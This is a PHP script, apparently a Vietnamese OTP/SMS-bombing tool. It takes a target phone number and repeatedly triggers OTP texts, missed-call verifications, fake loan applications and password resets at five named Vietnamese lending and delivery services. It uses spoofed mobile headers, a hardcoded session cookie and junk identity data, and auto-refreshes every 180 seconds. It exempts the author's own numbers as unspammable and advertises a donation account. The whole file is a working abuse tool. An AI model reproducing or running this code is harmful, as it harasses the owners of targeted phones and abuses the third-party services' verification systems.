<?php
echo header("refresh: 180");
header('content-type: application/json');
$sdt = $_POST["phone"];
if(strlen($sdt) < 10){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if(!$sdt){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if($sdt == "0338342654" or $sdt =="0588024068" or $sdt == "0562736657 " or $sdt == "0562736654"){
	echo ECHOJSON(array("msg" => "KHÔNG THỂ SPAM SỐ NÀY")); exit;
}
$MCREDIT = MCREDIT($sdt);///otp
$THANTAIOI = THANTAIOI($sdt);///otp call
$VAYSIEUDE = VAYSIEUDE($sdt);///send otp
$VAYVND = VAYVND($sdt);///send otp/////////
$LOSHIP = LOSHIP($sdt);//send otp
$array = array(
     "MCREDIT" => $MCREDIT["MCREDIT"],
    "THANTAIOI" => $THANTAIOI["THANTAIOI"],
    "VAYSIEUDE" => $VAYSIEUDE["VAYSIEUDE"],
	"LOSHIP" => $LOSHIP["LOSHIP"],
	"VAYVND" => $VAYVND["VAYVND"],
	"VERSION" => "5.0",
	"AUTO" => "180s/1",
      "DONATE" => "MBBANK 0588024068",
);
 if($MCREDIT["MCREDIT"]== "Thành Công"){
	$dem ++;
} else {
	$error ++;
}

if($THANTAIOI["THANTAIOI"]== "Thành Công"){
	$dem ++;
} else {
	$error ++;
}

if($VAYSIEUDE["VAYSIEUDE"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($VAYVND["VAYVND"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($LOSHIP["LOSHIP"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
$data = array(
	"REQUESTS" => "5",
	"SUCCESS" => $dem,
	"ERROR" => $error,
	"DATA-OPT" => $array
);
echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); 


function MCREDIT($sdt){
	$head = array(
		"Host: mcredit.com.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json; charset=UTF-8",
		"origin: https://mcredit.com.vn",
		"referer: https://mcredit.com.vn/",
	);
	$data = '"'.$sdt.'"';
	$get = CURL("POST", "https://mcredit.com.vn/api/Customers/requestOTP", $data, $head, false);
	if($get == ""){
		return array("MCREDIT" => "Thành Công");
	} else {
		return array("MCREDIT" => "Thất Bại");
	}
}

function THANTAIOI($sdt){///calll
	$sdt = "84".$sdt;
	$sdt = "84".str_replace("840", "", $sdt);
	$head = array(
		"Host: api.thantaioi.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://thantaioi.vn",
		"referer: https://thantaioi.vn/",
	);
	$data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"'.$sdt.'","target_url":"caydenthan.vn/"}';
	$get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user", $data, $head, false),true);
	$token = $get["token"];
	if($token){
		$head = array(
			"Host: api.thantaioi.vn",
			"accept-language: vi",
			"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
			"content-type: application/json",
			"authorization: Bearer ".$token,
			"accept: */*",
			"origin: https://thantaioi.vn",
			"referer: https://thantaioi.vn/",
		);
		$get = json_decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", null, $head, false),true);
	} else {
		$data = '{"phone":"'.$sdt.'"}';
		$get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user/send-one-time-password", $data, $head, false),true);
	}
	if($get["phone_confirmation_type"] == "missed_call"){
		return array("THANTAIOI" => "Thành Công");
	} else {
		return array("THANTAIOI" => "Thất Bại");
	}
}



function VAYSIEUDE($sdt){
	$head = array(
		"Host: vaysieude.com",
		"cache-control: max-age=0",
		"upgrade-insecure-requests: 1",
		"origin: https://vaysieude.com",
		"content-type: application/x-www-form-urlencoded",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"referer: https://vaysieude.com/?click_id=643f76517a519600011858c1",
		"cookie: XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
	);
	$get = CURL("GET", "https://vaysieude.com/?click_id=643f76517a519600011858c1", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $get)[1])[0];
	$data = http_build_query(array(
		"_token" => $token,
		"loan[loan_amount]" => "20000000",
		"loan[full_name]" => "Không biết",
		"loan[identity]" => "123456789",
		"loan[phone]" => $sdt
	));
	$get = CURL("POST", "https://vaysieude.com/?click_id=643f76517a519600011858c1", $data, $head, false);
	if (strpos ($get, "An Error Occurred: Method Not Allowed") !== false){
		return array("VAYSIEUDE" => "Thất Bại");
	} else {
		return array("VAYSIEUDE" => "Thành Công");
	}
}

function VAYVND($sdt){
	$head = array(
		"Host: api.vayvnd.vn",
		"accept: application/json",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://vayvnd.vn",
		"referer: https://vayvnd.vn/",
	);
	$data = '{
  "phone": "'.$sdt.'",
  "utm_campaign": "null",
  "cpa_id": 7,
  "cpa_lead_data": {
    "click_id": "'.generateImei().'",
    "source_id": "source_6",
    "utm_score": "0.0'.generateRandomstr(strlen("13672266155481339")).'"
  },
  "utm_list": [
    {
      "utm_source": "jeffapp"
    }
  ],
  "source_site": 1,
  "reg_screen_resolution": {
    "width": 412,
    "height": 915
  }
}';
	$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", $data, $head, false));
	if($GET["data"]["id"]){
		return array("VAYVND" => "Thành Công");
	} else {
		$data = '{"login":"'.$sdt.'"}';
		$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users/password-reset", $data, $head, false));
		if($GET["result"] == 1 or $GET["result"] == "true") {
			return array("VAYVND" => "Thành Công");
		} else {
			return array("VAYVND" => "Thất Bại");
		}
	}
}
function LOSHIP($sdt){
	$a = "84". $sdt;
	$usersdt = explode("840", $a)[1];
	$head = array(
		"Host: latte.lozi.vn",
		"accept-language: vi_VN",
		"x-access-token: unknown",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://loship.vn",
		"referer: https://loship.vn/",
	);
	$data = '{"device":"Android 12","platform":"Chrome WebView/96.0.4664.104","countryCode":"84","phoneNumber":"'.$sdt.'"}';
	$GET = CURL("POST", "https://latte.lozi.vn/v1.2/auth/register/phone/initial", $data, $head,false);
	if (strpos ($GET, $usersdt) !== false){
		return array("LOSHIP" => "Thành Công");
	} else {
		return array("LOSHIP" => "Thất Bại");
	}
}

	
	
	
	
	
	
function CURL($method, $url, $data, $head, $headers){
	$ch = curl_init();
		curl_setopt_array($ch, array(
			CURLOPT_URL => $url,
			CURLOPT_HTTPHEADER => $head,
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_CUSTOMREQUEST => $method,
			CURLOPT_ENCODING => '',
			CURLOPT_HEADER => $headers,
			CURLOPT_POST => TRUE,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_FOLLOWLOCATION => TRUE
		));
	$access = curl_exec($ch); 
	return $access;
}
function json($data){
	return json_decode($data,true);
}
function generateRandom($length) {
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomString($length) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateImei() {
	return generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12);
}
function get_string($data) {
	return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php','-'),array('','','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
}
function get_microtime() {
	return round(microtime(true) * 1000);
}
function get_TOKEN() {
	return generateRandom(22).':'.generateRandom(9).'-'.generateRandom(20).'-'.generateRandom(12).'-'.generateRandom(7).'-'.generateRandom(7).'-'.generateRandom(53).'-'.generateRandom(9).'_'.generateRandom(11).'-'.generateRandom(4);
}
function get_SECUREID($length = 17) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomstr($length) {
	$characters = '0123456789';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function ECHOJSON($data){
	return json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}
function GET($data){
	return json(file_get_contents($data));
}